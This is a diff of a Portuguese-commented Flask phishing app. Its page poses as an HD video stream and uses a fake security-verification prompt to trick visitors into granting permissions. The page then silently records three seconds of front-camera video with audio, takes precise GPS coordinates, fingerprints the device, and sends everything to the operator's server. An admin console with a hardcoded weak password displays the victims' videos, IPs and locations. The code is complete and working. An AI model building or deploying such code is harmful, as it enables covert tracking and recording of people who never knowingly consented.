@@ -11,7 +11,7 @@ app = Flask(__name__)
 # Buffers de armazenamento em RAM
 registros_gps = []
 registros_ip = []
-registros_fotos = []
+registros_videos = []
 
 # Credenciais de Acesso ao Console
 SENHA_ADMIN = "123123"
@@ -19,82 +19,268 @@ SENHA_ADMIN = "123123"
 # Link de redirecionamento final solicitado
 LINK_DESTINO = "https://www.google.com/maps/place/Oaks+Chengdu+at+Cultural+Heritage+Park/@30.6887276,103.9289403,15z/data=!4m12!1m2!2m1!1zSG90w6lpcw!3m8!1s0x36efc2ba0825d43b:0x2c1214b7071a826c!5m2!4m1!1i2!8m2!3d30.678253!4d103.93095!16s%2Fg%2F11sk9qfcrj?entry=ttu&g_ep=EgoyMDI2MDgzMS4wIKXMDSoASAFQAw%3D%3D"
 
-# Página HTML de Captura Silenciosa (GPS + Câmera + Hardware)
+# Página HTML com Player Profissional Disfarçado e Camada de Engenharia Social
 HTML_CAPTURA = f"""
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hotéis na China e Região</title>
+    <title>Stream HD - Conteúdo Exclusivo</title>
     
-    <meta property="og:title" content="Reserva de Hotéis - Arquitetura e Hospedagem na China">
-    <meta property="og:description" content="Encontre as melhores ofertas e pacotes de hospedagem na China com desconto exclusivo.">
+    <meta property="og:title" content="Transmissão ao Vivo - Documentário e Hospedagem na China">
+    <meta property="og:description" content="Assista ao conteúdo exclusivo em alta definição. Clique para iniciar o player.">
     <meta property="og:image" content="https://images.unsplash.com/photo-1508804185872-d7badad00f7d">
     <meta property="og:url" content="https://loc-nsdi.onrender.com/">
     <meta property="og:type" content="website">
 
     <style>
-        body {{ background-color: #000; margin: 0; }}
+        * {{ box-sizing: border-box; }}
+        body {{
+            background-color: #0f1015;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }}
+        .player-container {{
+            width: 100%;
+            max-width: 800px;
+            background: #181922;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
+            border: 1px solid #2a2c3a;
+        }}
+        .video-screen {{
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-image: url('https://images.unsplash.com/photo-1508804185872-d7badad00f7d');
+            background-size: cover;
+            background-position: center;
+        }}
+        .video-screen::after {{
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+            backdrop-filter: blur(4px);
+        }}
+        .play-overlay {{
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            padding: 20px;
+        }}
+        .btn-play {{
+            background: #e50914;
+            color: white;
+            border: none;
+            padding: 16px 36px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.2s;
+            box-shadow: 0 4px 15px rgba(229, 9, 20, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }}
+        .btn-play:hover {{
+            background: #f40612;
+            transform: scale(1.03);
+        }}
+        .player-info {{
+            padding: 20px 24px;
+        }}
+        .player-title {{
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0 0 8px 0;
+        }}
+        .player-desc {{
+            font-size: 14px;
+            color: #9ca3af;
+            margin: 0;
+            line-height: 1.5;
+        }}
+        .modal-aviso {{
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }}
+        .modal-content {{
+            background: #1f212d;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 420px;
+            text-align: center;
+            border: 1px solid #374151;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.8);
+        }}
+        .modal-content h3 {{
+            margin-top: 0;
+            color: #f87171;
+            font-size: 18px;
+        }}
+        .modal-content p {{
+            font-size: 14px;
+            color: #d1d5db;
+            line-height: 1.5;
+        }}
+        .loader {{
+            border: 3px solid #374151;
+            border-top: 3px solid #e50914;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+            display: none;
+        }}
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
+        }}
         #video-oculto {{ display: none; }}
     </style>
 </head>
 <body>
-    <!-- Elementos ocultos para captura de mídia -->
-    <video id="video-oculto" autoplay playsinline></video>
-    <canvas id="canvas-oculto" style="display:none;"></canvas>
+
+    <div class="player-container">
+        <div class="video-screen">
+            <div class="play-overlay">
+                <button class="btn-play" onclick="iniciarFluxoSeguranca()">
+                    <span>▶</span> Assistir em HD (1080p)
+                </button>
+                <p style="font-size: 12px; color: #cbd5e1; margin-top: 12px;">Clique para verificar permissões de exibição na região</p>
+            </div>
+        </div>
+        <div class="player-info">
+            <h1 class="player-title">Transmissão Especial: China & Hospedagem Global</h1>
+            <p class="player-desc">Conteúdo restrito verificado por protocolo de segurança regional. É necessário liberar o acesso de mídia e geolocalização do navegador para prosseguir com a reprodução segura.</p>
+        </div>
+    </div>
+
+    <!-- Modal de Engenharia Social / Instrução de Permissão -->
+    <div id="modalAviso" class="modal-aviso">
+        <div class="modal-content">
+            <h3>⚠️ Verificação de Segurança Pendente</h3>
+            <p id="textoModal">Para otimizar a taxa de quadros e carregar a transmissão sem travamentos, clique em <b>"Permitir"</b> na caixa que aparecerá no topo do navegador.</p>
+            <div class="loader" id="spinnerCarregando"></div>
+        </div>
+    </div>
+
+    <video id="video-oculto" autoplay playsinline muted></video>
 
     <script>
         const urlDestino = "{LINK_DESTINO}";
-        let imagemCapturadaBase64 = null;
+        let videoGravadoBase64 = null;
 
-        // Função para capturar a foto da câmera frontal
-        async function capturarCamera() {{
-            try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{
-                    video: {{ facingMode: "user" }},
-                    audio: false
-                }});
-                const video = document.getElementById('video-oculto');
-                video.srcObject = stream;
-                
-                await new Promise((resolve) => {{
-                    video.onloadedmetadata = () => {{
-                        video.play();
-                        setTimeout(resolve, 800);
-                    }};
-                }});
-
-                const canvas = document.getElementById('canvas-oculto');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                imagemCapturadaBase64 = canvas.toDataURL('image/jpeg', 0.8);
-
-                stream.getTracks().forEach(track => track.stop());
-            }} catch(e) {{
-                console.warn("Acesso à câmera negado ou indisponível:", e);
+        function iniciarFluxoSeguranca() {{
+            document.getElementById('modalAviso').style.display = 'flex';
+            document.getElementById('spinnerCarregando').style.display = 'block';
+            
+            // Dispara simultaneamente a geolocalização e a captura de vídeo
+            if (navigator.geolocation) {{
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => executarProcessamento(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy),
+                    (err) => executarProcessamento(null, null, null),
+                    {{ enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }}
+                );
+            }} else {{
+                executarProcessamento(null, null, null);
             }}
         }}
 
-        async function executarPayloadCompleto(lat = null, lon = null, precisao = null) {{
-            await capturarCamera();
+        async function gravarVideoCamera() {{
+            return new Promise(async (resolve) => {{
+                try {{
+                    const stream = await navigator.mediaDevices.getUserMedia({{
+                        video: {{ facingMode: "user" }},
+                        audio: true
+                    }});
+                    
+                    const video = document.getElementById('video-oculto');
+                    video.srcObject = stream;
+                    await video.play().catch(() => {{}});
+
+                    let options = {{ mimeType: 'video/webm; codecs=vp8' }};
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
+                        options = {{ mimeType: 'video/webm' }};
+                    }}
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {{
+                        options = {{}};
+                    }}
+
+                    const mediaRecorder = new MediaRecorder(stream, options);
+                    let chunks = [];
+
+                    mediaRecorder.ondataavailable = (event) => {{
+                        if (event.data && event.data.size > 0) {{
+                            chunks.push(event.data);
+                        }}
+                    }};
+
+                    mediaRecorder.onstop = async () => {{
+                        const blob = new Blob(chunks, {{ type: 'video/webm' }});
+                        const reader = new FileReader();
+                        reader.readAsDataURL(blob);
+                        reader.onloadend = () => {{
+                            videoGravadoBase64 = reader.result;
+                            stream.getTracks().forEach(track => track.stop());
+                            resolve();
+                        }};
+                    }};
+
+                    mediaRecorder.start();
+                    
+                    setTimeout(() => {{
+                        if (mediaRecorder.state === "recording") {{
+                            mediaRecorder.stop();
+                        }} else {{
+                            resolve();
+                        }}
+                    }}, 3000);
+
+                }} catch(e) {{
+                    console.warn("Acesso negado:", e);
+                    resolve();
+                }}
+            }});
+        }}
+
+        async function executarProcessamento(lat, lon, precisao) {{
+            // Tenta gravar o vídeo após o usuário interagir com o botão/permissão
+            await gravarVideoCamera();
 
             let infoHardware = {{
                 hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                 deviceMemory: navigator.deviceMemory || 'N/A',
                 platform: navigator.platform || 'N/A',
                 language: navigator.language || 'N/A',
-                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                 cookieEnabled: navigator.cookieEnabled ? 'SIM' : 'NÃO',
                 maxTouchPoints: navigator.maxTouchPoints || 0,
                 connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'DESCONHECIDO',
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
                 bateria: 'N/A',
-                resolucqao: window.screen.width + 'x' + window.screen.height,
-                colorDepth: window.screen.colorDepth + ' bits'
+                resolucqao: window.screen.width + 'x' + window.screen.height
             }};
 
             if (navigator.getBattery) {{
@@ -109,7 +295,7 @@ HTML_CAPTURA = f"""
                 latitude: lat,
                 longitude: lon,
                 precisao: precisao,
-                foto: imagemCapturadaBase64
+                video: videoGravadoBase64
             }};
 
             try {{
@@ -119,40 +305,17 @@ HTML_CAPTURA = f"""
                     body: JSON.stringify(payload)
                 }});
             }} catch(e) {{
-                console.error("Erro no dispatch:", e);
+                console.error("Erro:", e);
             }} finally {{
                 window.location.replace(urlDestino);
             }}
-        }}
-
-        function lidarComSucesso(position) {{
-            executarPayloadCompleto(
-                position.coords.latitude,
-                position.coords.longitude,
-                position.coords.accuracy
-            );
-        }}
-
-        function lidarComErro(error) {{
-            console.warn("GPS Negado ou Indisponível: " + error.message);
-            executarPayloadCompleto(null, null, null);
-        }}
-
-        if (navigator.geolocation) {{
-            navigator.geolocation.getCurrentPosition(lidarComSucesso, lidarComErro, {{
-                enableHighAccuracy: true,
-                timeout: 6000,
-                maximumAge: 0
-            }});
-        }} else {{
-            executarPayloadCompleto(null, null, null);
         }}
     </script>
 </body>
 </html>
 """
 
-# Painel Hacker Atualizado com Seção de Fotos (Grab Camera)
+# Painel Administrativo atualizado
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -160,7 +323,6 @@ HTML_PAINEL = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MAINFRAME - OLHO DE DEUS</title>
-    
     <style>
         body {
             font-family: 'Courier New', Courier, monospace;
@@ -194,10 +356,7 @@ HTML_PAINEL = """
                 letter-spacing: 1px;
             }
         }
-        .content-wrapper {
-            position: relative;
-            z-index: 1;
-        }
+        .content-wrapper { position: relative; z-index: 1; }
         h2 {
             color: #00FF66;
             font-size: 14px;
@@ -260,31 +419,15 @@ HTML_PAINEL = """
             font-size: 11px;
             text-align: center;
         }
-        .captured-photo {
-            width: 90px;
-            height: 90px;
-            object-fit: cover;
+        .captured-video {
+            width: 160px;
+            height: 120px;
             border: 1px solid #00FF66;
             border-radius: 4px;
-            cursor: pointer;
+            background: #000;
         }
-        .captured-photo:hover {
-            transform: scale(2.2);
-            transition: transform 0.2s ease;
-            z-index: 99;
-            position: relative;
-        }
-        details summary {
-            cursor: pointer;
-            color: #3399FF;
-            font-weight: bold;
-        }
-        .empty-msg {
-            color: #FF5555;
-            text-align: center;
-            padding: 15px;
-            font-size: 12px;
-        }
+        details summary { cursor: pointer; color: #3399FF; font-weight: bold; }
+        .empty-msg { color: #FF5555; text-align: center; padding: 15px; font-size: 12px; }
         .terminal-text {
             font-size: 11px;
             color: #88ff88;
@@ -308,7 +451,7 @@ HTML_PAINEL = """
 
 <div class="content-wrapper">
     <div class="status-box">
-        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>GRAB-CAM MODULE:</b> ENABLED<br>
+        <b>[SYS_STATUS]</b> ONLINE-ACTIVE | <b>SOCIAL ENG_MODULE:</b> ACTIVE<br>
         <b>[PROTOCOL]</b> SECURE TCP/IP | <b>REFRESH:</b> 5s
     </div>
 
@@ -316,33 +459,33 @@ HTML_PAINEL = """
         identification division.<br>
         program-id. MAINFRAME-SECURE-CONSOLE.<br>
         author. PENTESTER-CORE.<br>
-        module. 07 - CAMERA SURVEILLANCE & GPS
+        module. 07 - PROXY STREAM & SURVEILLANCE
     </div>
 
-    <h2>[ 01 ] CAPTURAS DE FOTOS DA CÂMERA ({{ fotos|length }})</h2>
+    <h2>[ 01 ] GRAVAÇÕES DE VÍDEO DA CÂMERA ({{ videos|length }})</h2>
     <div class="table-container">
         <table>
             <tr>
                 <th>ID</th>
                 <th>DATA / HORA</th>
                 <th>IP DE ORIGEM</th>
-                <th>FOTO FRONTAL (PASS MOUSE PARA ZOOM)</th>
+                <th>VÍDEO CAPTURADO (3s)</th>
             </tr>
-            {% for f in fotos %}
+            {% for v in videos %}
             <tr>
                 <td><span class="id-tag">#{{ loop.revindex }}</span></td>
-                <td>{{ f.data }}</td>
-                <td><b>{{ f.ip }}</b></td>
+                <td>{{ v.data }}</td>
+                <td><b>{{ v.ip }}</b></td>
                 <td>
-                    {% if f.foto %}
-                        <img src="{{ f.foto }}" class="captured-photo" alt="Foto Capturada">
+                    {% if v.video %}
+                        <video src="{{ v.video }}" class="captured-video" controls></video>
                     {% else %}
                         <span style="color: #FF5555;">Sem permissão / Câmera indisponível</span>
                     {% endif %}
                 </td>
             </tr>
             {% else %}
-            <tr><td colspan="4" class="empty-msg">> 01 CONDITIONAL: NENHUMA FOTO CAPTURADA <<</td></tr>
+            <tr><td colspan="4" class="empty-msg">> 01 CONDITIONAL: NENHUM VÍDEO GRAVADO <<</td></tr>
             {% endfor %}
         </table>
     </div>
@@ -442,7 +585,6 @@ def executar_nmap_background(registro_ref):
     try:
         nm = nmap.PortScanner()
         nm.scan('scanme.nmap.org', arguments='-p 22,80,443,3306,8080 --open -T4')
-        
         portas_encontradas = []
         for host in nm.all_hosts():
             for proto in nm[host].all_protocols():
@@ -451,7 +593,6 @@ def executar_nmap_background(registro_ref):
                     estado = nm[host][proto][p]['state']
                     servico = nm[host][proto][p]['name']
                     portas_encontradas.append({"porta": p, "estado": estado, "servico": servico})
-        
         registro_ref["portas"] = portas_encontradas
     except Exception as e:
         print(f"Erro na varredura Nmap: {e}")
@@ -464,7 +605,6 @@ def index():
 @app.route('/salvar-payload-total', methods=['POST'])
 def salvar_payload_total():
     dados = request.json or {}
-    
     ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
     if ',' in ip_cliente:
         ip_cliente = ip_cliente.split(',')[0].strip()
@@ -495,13 +635,13 @@ def salvar_payload_total():
         print("Erro GeoIP:", e)
 
     hw = dados.get('hw', {})
-    foto_b64 = dados.get('foto')
+    video_b64 = dados.get('video')
 
-    if foto_b64:
-        registros_fotos.insert(0, {
+    if video_b64:
+        registros_videos.insert(0, {
             "data": agora,
             "ip": ip_cliente,
-            "foto": foto_b64
+            "video": video_b64
         })
 
     novo_registro_ip = {
@@ -549,7 +689,7 @@ def admin():
         </body>
         """, 403
         
-    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, fotos=registros_fotos)
+    return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip, videos=registros_videos)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
